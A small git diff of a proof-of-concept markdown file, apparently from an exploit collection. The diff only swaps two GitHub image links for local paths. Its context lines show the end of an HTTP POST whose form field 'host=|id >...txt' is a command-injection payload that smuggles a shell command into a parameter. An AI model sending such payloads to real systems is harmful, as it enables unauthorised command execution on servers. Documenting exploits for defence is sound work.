@@ -19,6 +19,6 @@ Content-Type: application/x-www-form-urlencoded
 
 token=1&id=2&host=|id >2cWKiiWovWYAIcNUBPkZph4xPLs.txt
 ```
-![image](https://github.com/wy876/POC/assets/139549762/44588f4b-2c3a-45c6-bc27-951795c2d64b)
+![image](../../images/44588f4b-2c3a-45c6-bc27-951795c2d64b.png)
 
-![image](https://github.com/wy876/POC/assets/139549762/90d69ec6-1058-4563-b02f-0721a1c68e8f)
+![image](../../images/90d69ec6-1058-4563-b02f-0721a1c68e8f.png)
